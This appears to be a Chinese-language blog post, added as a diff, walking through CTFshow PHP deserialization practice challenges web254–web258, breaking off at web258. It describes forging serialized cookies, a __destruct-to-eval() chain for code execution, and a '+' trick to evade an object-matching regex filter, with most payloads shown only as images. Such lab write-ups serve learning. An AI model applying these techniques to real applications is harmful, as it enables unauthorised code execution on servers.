@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lzer0kx.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="CTFshow 很棒的一个练习ctf-web的靶场 反序列化篇">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFshow-web入门-反序列化">
+<meta property="og:url" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Lzer0Kx的信安之路">
+<meta property="og:description" content="CTFshow 很棒的一个练习ctf-web的靶场 反序列化篇">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216151942387.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216151952963.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152002574.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152013370.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152019809.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152026872.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152035976.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152043371.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152049604.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152059543.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152106363.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152113775.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152121748.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152130244.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152136296.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152147472.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152153516.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152215197.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152220836.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152230327.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152237098.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152242685.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152252171.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152258679.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152304748.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152319732.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152330873.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152336944.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152343373.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152355553.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152402115.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152409902.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152416258.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152425957.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152433823.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152440526.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152447244.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152452721.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152459279.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152511310.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152517686.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152524406.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152530577.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152536304.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152542279.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152551669.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152558936.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152605608.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152612336.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152619044.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152625875.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152631982.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152637245.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152644122.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152651022.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152708033.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152713469.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152720291.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152726720.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152731676.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152738019.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152745909.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152751777.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152757787.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152803478.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152812456.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152819171.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152827155.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152833407.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152839882.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152845845.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152854413.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152908248.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152914683.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152925353.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152931105.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152947664.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152955230.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153005355.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153011587.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153020923.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153028810.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153034910.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153041737.png">
+<meta property="og:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153048845.png">
+<meta property="article:published_time" content="2022-12-16T07:33:20.000Z">
+<meta property="article:modified_time" content="2022-12-16T07:49:30.348Z">
+<meta property="article:author" content="Lzer0Kx">
+<meta property="article:tag" content="CTF刷题笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216151942387.png">
+
+<link rel="canonical" href="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CTFshow-web入门-反序列化 | Lzer0Kx的信安之路</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Lzer0Kx的信安之路</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://lzer0kx.top/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Lzer0Kx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lzer0Kx的信安之路">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CTFshow-web入门-反序列化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-16 15:33:20 / 修改时间：15:49:30" itemprop="dateCreated datePublished" datetime="2022-12-16T15:33:20+08:00">2022-12-16</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CTFshow 很棒的一个练习ctf-web的靶场</p>
+<p>反序列化篇</p>
+<span id="more"></span>
+
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216151942387.png" alt="image-20221216151942387"></p>
+<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216151952963.png" alt="image-20221216151952963"></p>
+<p>找了半天没找到魔术方法 原来根本没用到魔术方法没涉及到反序列化 直接传参打就行</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure>
+
+<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152002574.png" alt="image-20221216152002574"></p>
+<p>首先get传入的参数$username和$password和上一题一样 主要是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>需要反序列化后的结果是ctfShowUser的实例化对象，并且只有在$this→isVip是true的情况下才会读到flag</p>
+<p>payload</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152013370.png" alt="image-20221216152013370"></p>
+<p>构造数据包 这儿还是得编码一下防止过滤掉一些字符 直接拿来用得不到flag</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152019809.png" alt="image-20221216152019809"></p>
+<p>&amp;#x20;</p>
+<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152026872.png" alt="image-20221216152026872"></p>
+<p>比上一题多了这个 传入的username和password值要求不相等</p>
+<p>读flag的思路还是和上一关相同</p>
+<p>要在链子中也将$username的值覆盖掉</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152035976.png" alt="image-20221216152035976"></p>
+<p>抓包</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152043371.png" alt="image-20221216152043371"></p>
+<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152049604.png" alt="image-20221216152049604"></p>
+<p>危险函数是eval() 我们要能覆盖掉$code参数达到rce的目的</p>
+<p>再看魔术方法</p>
+<p>__construct  在对象初始化 被赋初值时触发</p>
+<p>__destruct   在对象不再被使用或者程序退出时触发</p>
+<p>要想调用eval()方法就要调用backDoor类的getInfo方法  发现触发__destruct方法就会调用</p>
+<p>构造链子</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152059543.png" alt="image-20221216152059543"></p>
+<p>拿到flag</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152106363.png" alt="image-20221216152106363"></p>
+<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152113775.png" alt="image-20221216152113775"></p>
+<p>加了一个正则表达式过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d      匹配一个数字字符  等价于[0-9]</span><br><span class="line">+      匹配前面的子表达式一次或多次</span><br><span class="line">/i     表示匹配的时候不区分大小写</span><br><span class="line">匹配字母o或者c后面 第一个字符开始是数字 就过滤掉</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>怎么绕过这个正则表达式呢 我们在本地先测试一下</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152121748.png" alt="image-20221216152121748"></p>
+<p>可以看到被拦截了</p>
+<p>但是在类名长度前加个+</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152130244.png" alt="image-20221216152130244"></p>
+<p>成功绕过</p>
